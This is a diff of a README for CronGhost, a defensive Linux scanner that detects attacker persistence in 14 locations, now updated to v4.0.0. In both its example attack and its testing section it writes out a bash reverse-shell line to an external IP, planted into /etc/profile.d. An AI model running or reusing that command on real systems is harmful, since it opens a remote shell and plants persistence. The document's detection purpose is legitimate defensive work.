@@ -7,11 +7,11 @@
 | |___| | | (_) | | | | |_| || | | | (_) \__ \ |_ 
  \____|_|  \___/|_| |_|\____||_| |_|\___/|___/\__|
 
-  Scheduled Task Shadow Scanner — v3.0.0 
+  Scheduled Task Shadow Scanner — v4.0.0
   Created by Artist-22
 ```
 
-> **The only tool that scans all 14 Linux persistence locations simultaneously — with cryptographic baseline verification.**
+> **The only tool that scans all 14 Linux persistence locations simultaneously — with cryptographic baseline, entropy analysis, rootkit evasion detection, and self-integrity verification.**
 
 ---
 
@@ -19,21 +19,21 @@
 
 CronGhost is a Linux security tool that detects malicious scheduled tasks, hidden autorun scripts, and attacker persistence mechanisms planted on your system.
 
-Most security tools only check the obvious places — `/etc/crontab` and a few cron folders. Attackers know this. They hide in the other 10 locations that scanners never check.
+Most security tools only check the obvious places. Attackers know this. They hide in the other locations that no scanner checks.
 
-CronGhost checks all 14.
+CronGhost checks all 14 — and then goes deeper than any other tool.
 
 ---
 
 ## The Problem It Solves
 
-When an attacker compromises a Linux system they always plant a **persistence mechanism** — a hidden script that runs automatically so they can get back in even after passwords are changed or the initial vulnerability is patched.
+When an attacker compromises a Linux system they always plant a persistence mechanism — a hidden script that runs automatically so they can get back in even after passwords are changed or the initial vulnerability is patched.
 
 These persistence scripts hide in locations most admins never look at:
 
 ```
 /etc/profile.d/       runs on every single user login
-/etc/pam.d/           runs on every authentication event  
+/etc/pam.d/           runs on every authentication event
 /etc/rc.local         runs at every system boot
 XDG autostart         runs when the desktop starts
 systemd timers        runs on a schedule invisibly
@@ -56,9 +56,9 @@ A real attacker case — a company wiped their entire server after a breach. Cha
 | 7 | `/etc/cron.monthly/` | Runs every month automatically |
 | 8 | `/etc/anacrontab` | Runs missed jobs after reboot |
 | 9 | `systemd timers` | Modern invisible scheduler |
-| 10 | `/etc/profile.d/` | **Runs on every login — most missed** |
+| 10 | `/etc/profile.d/` | Runs on every login — most missed |
 | 11 | `/etc/environment` | Loaded before the shell starts |
-| 12 | `PAM exec module` | **Runs on every authentication** |
+| 12 | `PAM exec module` | Runs on every authentication |
 | 13 | `/etc/rc.local` | Runs at every single boot |
 | 14 | `XDG autostart` | Targets workstations silently |
 
@@ -68,33 +68,55 @@ Locations 10 to 14 are where real attackers hide because no basic scanner checks
 
 ## Three Tiers of Detection
 
-CronGhost uses a layered approach so even advanced attackers cannot hide.
-
 ### Tier 1 — Pattern Detection
 Scans file content for known attack patterns — reverse shells, download-and-execute payloads, encoded commands, suspicious file paths. Catches script kiddies and intermediate attackers instantly.
 
 ### Tier 2 — Intelligent Analysis
-Goes beyond simple pattern matching. Checks:
-- **Package manager verification** — did `apt` install this file or did someone drop it manually?
-- **File age analysis** — was this created at 2AM when no admin was watching?
-- **Owner verification** — is this file owned by an unexpected user?
-- **Modification detection** — has this system file been changed since it was installed?
-
-Every finding gets a **confidence score** from 0 to 100. Low confidence findings are filtered out automatically — no noise, only real threats.
+Goes beyond simple pattern matching:
+- Package manager verification — did apt install this or did someone drop it manually?
+- File age analysis — was this created at 2AM when no admin was watching?
+- Owner verification — is this file owned by an unexpected user?
+- Confidence scoring — every finding gets a score from 0 to 100%
 
 ### Tier 3 — Cryptographic Baseline
-The most powerful layer. On first run CronGhost photographs every file in every persistence location as a **SHA256 cryptographic hash**. Every future scan compares against that snapshot.
+The most powerful layer. On first run CronGhost photographs every file as a SHA256 cryptographic hash. Every future scan compares against that snapshot. If any file changes even a single byte — CronGhost reports it with 92% confidence.
 
-If any file changes — even a single byte — CronGhost reports it with **90% confidence**. An attacker can fool pattern scanners. They cannot fool mathematics.
+---
 
-```
-Run 1 (clean system)  →  baseline created
-                          every file hashed and saved
+## Advanced Detection Features (v4.0.0)
 
-Run 2 (after attack)  →  attacker dropped /etc/profile.d/backdoor.sh
-                          CronGhost: [CRITICAL] NEW FILE — not in baseline
-                          Confidence: 85%
-```
+### Self Integrity Verification
+CronGhost verifies its own executable has not been tampered with before every scan. An expert attacker who modifies CronGhost to hide results — CronGhost catches that too.
+
+### Entropy Analysis
+Every file is scored for Shannon entropy. Normal shell scripts score 3.5 to 5.0. Encrypted or packed payloads score above 7.0. A high entropy score in a persistence location means a hidden encrypted payload is present.
+
+### Network C2 Callback Detection
+Automatically extracts IP addresses and domains from all persistence files. Any file containing an external IP or suspicious domain is flagged as a C2 indicator.
+
+### Rootkit Evasion Check
+Compares Python's raw `os.listdir()` against the output of `ls`. A rootkit hooks the ls command to hide files. If they disagree — CronGhost exposes what the rootkit is hiding.
+
+### Hidden File Detector
+Legitimate cron files are never dotfiles. CronGhost finds files starting with `.` in persistence directories — a classic attacker hiding technique.
+
+### Timestamp Anomaly Detection
+Detects files with timestamps from the future, zeroed timestamps, or timestamps that were backdated — all signs of attacker clock manipulation.
+
+### Permission Anomaly Detection
+Flags world-writable persistence files, SETUID bits, and SETGID bits — dangerous permission configurations that should never appear in persistence locations.
+
+### Cross-Reference Detection
+If the same malicious payload appears in multiple persistence locations — the attacker planted redundant persistence. CronGhost detects this pattern and reports it as a coordinated attack.
+
+### Auto Quarantine
+Moves suspicious files to a secure quarantine directory while leaving an empty decoy in place — so the attacker does not know their persistence was removed. Every quarantined file is preserved with metadata for forensic analysis.
+
+### Live Watch Mode
+Monitors all 14 persistence locations in real time. Checks every 30 seconds. Alerts immediately when any file is added, modified, or deleted. Press Ctrl+C to stop.
+
+### Threat History Log
+Every scan result is logged to a persistent history file at `/var/lib/cronghost/history.log`. Full audit trail of every finding across every scan.
 
 ---
 
@@ -102,7 +124,6 @@ Run 2 (after attack)  →  attacker dropped /etc/profile.d/backdoor.sh
 
 **The attack:**
 ```bash
-# Attacker plants a reverse shell that runs on every login
 echo 'bash -i >& /dev/tcp/185.220.101.42/4444 0>&1' > /etc/profile.d/updater.sh
 ```
 
@@ -110,18 +131,18 @@ echo 'bash -i >& /dev/tcp/185.220.101.42/4444 0>&1' > /etc/profile.d/updater.sh
 ```
 [!!]  10/14  /etc/profile.d/          critical
 
-[CRITICAL]  /etc/profile.d/updater.sh
+[CRITICAL]  /etc/profile.d/updater.sh  [HIDDEN FILE] [C2 INDICATOR] [ODD HOUR]
 
   Confidence    [████████████████████] 95%
+  Entropy       4.2 / 8.0
 
   Package       NOT in dpkg — manually placed
   Owner         root
   File age      created 2026-03-21 02:14  ODD HOUR
+  C2 IPs        185.220.101.42
 
   Content hits
-    [HIGH]  +90  bash -i >& /dev/tcp/   classic reverse shell
-
-  Baseline      NEW FILE — did not exist in baseline
+    +95  bash -i >& /dev/tcp/   classic bash reverse shell
 ```
 
 ---
@@ -132,26 +153,14 @@ echo 'bash -i >& /dev/tcp/185.220.101.42/4444 0>&1' > /etc/profile.d/updater.sh
 - Linux (Kali, Ubuntu, Debian or any Debian-based distro)
 - Python 3.6 or higher
 - Root access
-- `python3-pillow` for icon generation (auto-installed)
 
 ### Install
 
 ```bash
-# Clone the repository
-git clone https://github.com/ARTIST/cronghost.git
-
-# Enter the folder
+git clone https://github.com/Artist-22/cronghost.git
 cd cronghost
-
-# Run the installer
 sudo bash install.sh
 ```
-
-The installer automatically:
-- Installs CronGhost as a system command
-- Generates and installs the custom icon
-- Adds CronGhost to the Kali application menu
-- Creates the data directory for baseline storage
 
 ### Run
 
@@ -159,22 +168,18 @@ The installer automatically:
 sudo cronghost
 ```
 
-That is it. No flags, no config files, no setup. Just run it.
-
 ---
 
 ## First Time Setup
 
-When you run CronGhost for the first time on a clean system:
-
 ```
-1. Run:   sudo cronghost
-2. Choose option 4 — Create baseline
-3. Wait for it to hash all files (takes a few seconds)
-4. Done — your clean system is now on record
+1. Run:    sudo cronghost
+2. Choose  option 5 — Create baseline
+3. Wait    for all files to be hashed
+4. Done    — your clean system is on record
 ```
 
-Every scan after this compares against your baseline. Any new file, any modified file, any deleted file — CronGhost sees it immediately.
+Every scan after this compares against your baseline.
 
 ---
 
@@ -184,21 +189,13 @@ Every scan after this compares against your baseline. Any new file, any modified
 Options:
 
   1)  Run scan again
-  2)  Export report to file
-  3)  Update baseline with current system state
-  4)  Create baseline (first time setup)
-  5)  Quit
+  2)  Export full report to file
+  3)  Quarantine a suspicious file
+  4)  Start live watch mode
+  5)  Create or rebuild baseline
+  6)  View threat history log
+  7)  Quit
 ```
-
-### Export a report
-
-Choose option 2 to export a full text report:
-
-```
-cronghost_report_20260321_035116.txt
-```
-
-The report contains every finding with full details — file path, threat score, confidence, package manager verification, file age, owner, and all matched patterns.
 
 ---
 
@@ -208,53 +205,60 @@ The report contains every finding with full details — file path, threat score,
 ```
 [OK]   — location is clean
 [!!]   — suspicious or critical finding
-[??]   — low confidence finding, worth reviewing
+[??]   — low confidence finding
 ```
 
 ### Verdict levels
 ```
-[CRITICAL]    — confidence 80%+  act immediately
-[SUSPICIOUS]  — confidence 60%+  investigate this
-[LOW]         — confidence below 60%  monitor it
+[CRITICAL]    — confidence 80%+   act immediately
+[SUSPICIOUS]  — confidence 55%+   investigate this
+[LOW]         — below 55%         monitor it
 ```
 
-### Confidence bar
+### Threat flags
 ```
-[████████████████████] 95%   ← almost certainly malicious
-[████████░░░░░░░░░░░░] 40%   ← suspicious but check manually
-[████░░░░░░░░░░░░░░░░] 20%   ← low risk, probably safe
+[HIDDEN FILE]        — dotfile in persistence location
+[C2 INDICATOR]       — external IP or domain found inside file
+[HIGH ENTROPY]       — encrypted or packed payload detected
+[ODD HOUR]           — file created between 1AM and 5AM
+[TIMESTAMP ANOMALY]  — clock manipulation detected
+[BAD PERMISSIONS]    — world-writable or SETUID detected
 ```
 
 ### Baseline alerts
 ```
-[CHANGED]    file content changed since your clean snapshot
-[NEW FILE]   file did not exist when baseline was created
-[DELETED]    file existed in baseline but is now gone
+[CHANGED]    — file content changed since your clean snapshot
+[NEW FILE]   — file did not exist when baseline was created
+[DELETED]    — file existed in baseline but is now gone
 ```
 
 ---
 
-## Why CronGhost is Different
+## What Makes CronGhost Different
 
-| Feature | Basic cron scanners | CronGhost |
+| Feature | Basic cron scanners | CronGhost v4.0.0 |
 |---|---|---|
-| Locations checked | 4-7 | **14** |
+| Locations checked | 4 to 7 | **14** |
 | False positive filtering | None | Smart whitelist + confidence scoring |
 | Package manager check | No | **Yes — dpkg verification** |
 | Cryptographic baseline | No | **Yes — SHA256 per file** |
-| Modification detection | No | **Yes — byte level** |
-| Confidence scoring | No | **Yes — 0 to 100%** |
-| Kali app menu integration | No | **Yes — with custom icon** |
-| Tier system | No | **Yes — Tier 1, 2, 3** |
+| Entropy analysis | No | **Yes — detects packed payloads** |
+| C2 callback detection | No | **Yes — IP and domain extraction** |
+| Rootkit evasion check | No | **Yes — raw readdir vs ls** |
+| Hidden file detection | No | **Yes — dotfile scanner** |
+| Timestamp anomaly | No | **Yes — clock manipulation detection** |
+| Self integrity check | No | **Yes — detects tool tampering** |
+| Auto quarantine | No | **Yes — preserves evidence** |
+| Live watch mode | No | **Yes — 30 second real time monitoring** |
+| Threat history | No | **Yes — persistent audit log** |
+| Cross-reference check | No | **Yes — multi-location payload detection** |
 
 ---
 
 ## Testing CronGhost
 
-Want to verify it works? Plant a fake malicious entry and watch CronGhost catch it:
-
 ```bash
-# Plant a fake reverse shell (safe test — no real connection)
+# Plant a fake malicious entry
 sudo bash -c 'echo "bash -i >& /dev/tcp/185.220.101.42/4444 0>&1" > /etc/profile.d/test_backdoor.sh'
 
 # Run CronGhost — it will flag it as CRITICAL
@@ -263,7 +267,7 @@ sudo cronghost
 # Clean up after testing
 sudo rm /etc/profile.d/test_backdoor.sh
 
-# Run again — should show all clean
+# Run again — all clean
 sudo cronghost
 ```
 
@@ -276,17 +280,18 @@ cd cronghost
 sudo bash uninstall.sh
 ```
 
-This removes all files, the icon, the app menu entry, and the baseline data.
+Removes all files, icon, app menu entry, baseline data, quarantine, and history.
 
 ---
 
 ## Roadmap
 
-- [ ] Email alerts when critical findings are detected
-- [ ] Daemon mode — runs silently in background 24/7
 - [ ] ProcessBlood — process ancestry attack detector
-- [ ] SocketLie — socket truth verifier
+- [ ] PortDNA — port behavior fingerprinter
 - [ ] EnvPoison — environment variable infection scanner
+- [ ] ShadowUser — hidden user and privilege detector
+- [ ] LibSnitch — shared library hijack detector
+- [ ] SocketLie — socket truth verifier
 - [ ] Unified suite — all tools under one installer
 
 ---
@@ -301,11 +306,15 @@ This removes all files, the icon, the app menu entry, and the baseline data.
 
 ---
 
+## Feedback and Bug Reports
+
+Found a bug or have a feature request? Open an issue on GitHub at github.com/Artist-22/cronghost — all feedback is welcome.
+
+---
+
 ## Legal and Ethical Use
 
-CronGhost is designed for use on systems you own or have explicit written permission to audit. Using this tool against systems you do not own or have permission to test is illegal and unethical.
-
-The author takes no responsibility for misuse.
+CronGhost is designed for use on systems you own or have explicit written permission to audit. Using this tool against systems you do not own is illegal and unethical. The author takes no responsibility for misuse.
 
 ---
 
